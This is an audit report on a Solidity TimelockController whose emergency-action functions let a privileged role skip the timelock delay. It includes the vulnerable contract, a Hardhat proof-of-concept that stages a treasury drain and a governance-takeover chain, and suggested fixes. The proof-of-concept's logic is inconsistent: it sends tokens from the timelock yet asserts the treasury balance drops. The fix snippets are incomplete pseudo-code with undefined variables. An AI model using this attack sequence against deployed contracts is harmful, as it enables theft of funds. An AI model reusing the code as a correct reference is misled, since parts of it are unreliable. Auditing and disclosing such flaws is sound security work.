# Timelock Security Bypass Through Unvalidated Emergency Actions



## Summary
The `TimelockController` contract contains a critical vulnerability where privileged roles can bypass timelock delays through unvalidated emergency actions, allowing instant execution of sensitive operations and undermining core security guarantees.

## Vulnerability Details
The `TimelockController` implements emergency action functionality that lacks proper validation and delay enforcement:

```solidity
contract TimelockController {
    mapping(bytes32 => bool) private _emergencyActions;

    // @audit No validation or delay for emergency actions
    function executeEmergencyAction(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata calldatas,
        bytes32 predecessor,
        bytes32 salt
    ) external payable onlyRole(EMERGENCY_ROLE) nonReentrant {
        bytes32 id = hashOperationBatch(targets, values, calldatas, predecessor, salt);
        if (!_emergencyActions[id]) revert EmergencyActionNotScheduled(id);
        delete _emergencyActions[id];
        
        // @audit Direct execution without delay
        for (uint256 i = 0; i < targets.length; i++) {
            (bool success,) = targets[i].call{value: values[i]}(calldatas[i]);
            if (!success) {
                revert CallReverted(id, i);
            }
        }
    }

    // @audit No validation of emergency conditions
    function scheduleEmergencyAction(bytes32 id) external onlyRole(EMERGENCY_ROLE) {
        _emergencyActions[id] = true;
        emit EmergencyActionScheduled(id, block.timestamp);
    }
}
```

The key issues:

* No validation of emergency conditions
* No minimum delay requirement
* No value limits on emergency actions
* No multi-signature requirement

## Impact
The vulnerability allows:

* Complete bypass of timelock delays
* Circumvention of governance voting periods
* Unauthorized asset transfers
* Breaking of core security assumptions

## Severity
* **Impact**: HIGH - Complete bypass of critical security mechanism
* **Likelihood**: MEDIUM - Requires privileged role access
* **Overall**: HIGH

## Proof of Concept
The following detailed PoC demonstrates how a malicious admin can exploit this vulnerability to bypass timelock restrictions and extract value:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe("TimelockController Emergency Bypass", function() {
    let timelockController;
    let token;
    let owner;
    let emergencyAdmin;
    let user;
    let treasury;

    // Test constants
    const TIMELOCK_DELAY = 48 * 3600; // 48 hours
    const AMOUNT = ethers.utils.parseEther("1000000"); // 1M tokens
    const ZERO_ADDRESS = ethers.constants.AddressZero;
    const ZERO_HASH = ethers.constants.HashZero;

    beforeEach(async function() {
        // Deploy contracts
        [owner, emergencyAdmin, user, treasury] = await ethers.getSigners();
        
        // Deploy mock token with large supply
        const Token = await ethers.getContractFactory("MockToken");
        token = await Token.deploy("Test Token", "TEST");
        await token.mint(treasury.address, AMOUNT.mul(10));
        
        // Deploy TimelockController
        const TimelockController = await ethers.getContractFactory("TimelockController");
        timelockController = await TimelockController.deploy(
            TIMELOCK_DELAY,
            [owner.address],
            [owner.address],
            owner.address
        );

        // Setup permissions
        const EMERGENCY_ROLE = await timelockController.EMERGENCY_ROLE();
        await timelockController.grantRole(EMERGENCY_ROLE, emergencyAdmin.address);

        // Transfer treasury ownership to timelock
        await token.connect(treasury).transferOwnership(timelockController.address);
    });

    it("Should prevent instant token transfer through normal timelock", async function() {
        // Encode transfer function call
        const transferCalldata = token.interface.encodeFunctionData(
            "transfer",
            [user.address, AMOUNT]
        );

        // Try to execute instantly
        await expect(
            timelockController.executeBatch(
                [token.address],
                [0],
                [transferCalldata],
                ZERO_HASH,
                ethers.utils.id("normal")
            )
        ).to.be.revertedWith("TimelockController: operation is not ready");
    });

    it("Should allow emergency admin to bypass timelock and steal funds", async function() {
        console.log("\n=== Starting Emergency Bypass Attack ===");

        // Record initial state
        const initialBalance = await token.balanceOf(treasury.address);
        console.log(
            `Initial treasury balance: ${ethers.utils.formatEther(initialBalance)} tokens`
        );

        // 1. Prepare malicious transfer
        const transferCalldata = token.interface.encodeFunctionData(
            "transfer", 
            [user.address, AMOUNT]
        );
        const operationId = await timelockController.hashOperationBatch(
            [token.address],
            [0],
            [transferCalldata],
            ZERO_HASH,
            ethers.utils.id("emergency")
        );

        // 2. Schedule emergency action
        console.log("\nScheduling emergency action...");
        await timelockController
            .connect(emergencyAdmin)
            .scheduleEmergencyAction(operationId);

        // 3. Execute immediately
        console.log("Executing emergency action instantly...");
        await timelockController
            .connect(emergencyAdmin)
            .executeEmergencyAction(
                [token.address],
                [0], 
                [transferCalldata],
                ZERO_HASH,
                ethers.utils.id("emergency")
            );

        // 4. Verify attack success
        const finalTreasuryBalance = await token.balanceOf(treasury.address);
        const userBalance = await token.balanceOf(user.address);

        console.log("\n=== Attack Results ===");
        console.log(`Treasury balance: ${ethers.utils.formatEther(finalTreasuryBalance)} tokens`);
        console.log(`Stolen amount: ${ethers.utils.formatEther(userBalance)} tokens`);

        // Assertions
        expect(userBalance).to.equal(AMOUNT);
        expect(finalTreasuryBalance).to.equal(initialBalance.sub(AMOUNT));

        console.log("\nAttack successful! Timelock bypassed and funds stolen.");
    });

    it("Should demonstrate potential for multi-step governance attacks", async function() {
        // 1. Setup multiple malicious actions
        const actions = [
            // Update timelock delay to 0
            timelockController.interface.encodeFunctionData("updateDelay", [0]),
            // Transfer ownership
            token.interface.encodeFunctionData("transferOwnership", [user.address]),
            // Drain funds
            token.interface.encodeFunctionData("transfer", [user.address, AMOUNT])
        ];

        // 2. Execute attack chain
        for(let i = 0; i < actions.length; i++) {
            const operationId = await timelockController.hashOperationBatch(
                [i === 0 ? timelockController.address : token.address],
                [0],
                [actions[i]],
                ZERO_HASH,
                ethers.utils.id(`emergency-${i}`)
            );

            await timelockController
                .connect(emergencyAdmin)
                .scheduleEmergencyAction(operationId);

            await timelockController
                .connect(emergencyAdmin)
                .executeEmergencyAction(
                    [i === 0 ? timelockController.address : token.address],
                    [0],
                    [actions[i]],
                    ZERO_HASH,
                    ethers.utils.id(`emergency-${i}`)
                );
        }

        // Verify complex attack success
        expect(await token.owner()).to.equal(user.address);
        expect(await token.balanceOf(user.address)).to.equal(AMOUNT);
    });
});
```

## Tools Used
* Manual code review
* Hardhat test framework
* Ethers.js
* Hardhat Network Helpers
* Slither static analyzer

## Recommendations
Add emergency validation and constraints:

```solidity
contract TimelockController {
    enum EmergencyType { NONE, SECURITY, UPGRADE, PARAMETER }
    uint256 public constant MIN_EMERGENCY_DELAY = 12 hours;
    
    mapping(bytes32 => EmergencyType) public emergencyReasons;
    mapping(EmergencyType => uint256) public emergencyThresholds;
    
    function scheduleEmergencyAction(
        bytes32 id,
        EmergencyType emergencyType,
        string calldata justification
    ) external onlyRole(EMERGENCY_ROLE) {
        require(emergencyType != EmergencyType.NONE, "Invalid emergency");
        emergencyReasons[id] = emergencyType;
        emit EmergencyActionScheduled(id, emergencyType, justification);
    }
    
    function executeEmergencyAction(...) {
        require(
            block.timestamp >= scheduledTime + MIN_EMERGENCY_DELAY,
            "Emergency delay not met"
        );
        require(
            values[0] <= emergencyThresholds[emergencyType],
            "Exceeds threshold"
        );
    }
}
```

Implement multi-sig requirement:

```solidity
contract TimelockController {
    uint256 public constant EMERGENCY_SIGNERS_REQUIRED = 3;
    mapping(bytes32 => mapping(address => bool)) public emergencyApprovals;
    mapping(bytes32 => uint256) public approvalCount;
    
    function approveEmergencyAction(bytes32 id) external onlyRole(EMERGENCY_ROLE) {
        require(!emergencyApprovals[id][msg.sender], "Already approved");
        emergencyApprovals[id][msg.sender] = true;
        approvalCount[id]++;
    }
    
    function executeEmergencyAction(...) {
        require(
            approvalCount[id] >= EMERGENCY_SIGNERS_REQUIRED,
            "Insufficient approvals"
        );
    }
}
```
